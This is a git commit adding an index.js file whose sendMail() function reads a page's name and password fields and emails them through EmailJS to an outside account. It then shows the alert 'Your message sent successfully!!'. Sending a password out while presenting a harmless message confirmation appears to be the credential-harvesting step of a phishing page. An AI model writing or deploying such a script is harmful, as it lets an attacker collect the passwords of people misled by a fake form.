d2d665053d246f14cb3dc9032689911111361d95
hdh51wq <hdh413767@gmail.com>
2024-09-12 17:00:11 +0100

    Create index.js

---
+++ index.js
@@ -0,0 +1,20 @@
+function sendMail() {
+  var params = {
+    name: document.getElementById("name").value,
+    password: document.getElementById("password").value,
+  };
+
+  const serviceID = "service_53n63ci";
+  const templateID = "template_c6srlei";
+
+    emailjs.send(serviceID, templateID, params)
+    .then(res=>{
+        document.getElementById("name").value = "";
+        document.getElementById("password").value= "";
+        console.log(res);
+        alert("Your message sent successfully!!")
+
+    })
+    .catch(err=>console.log(err));
+
+}
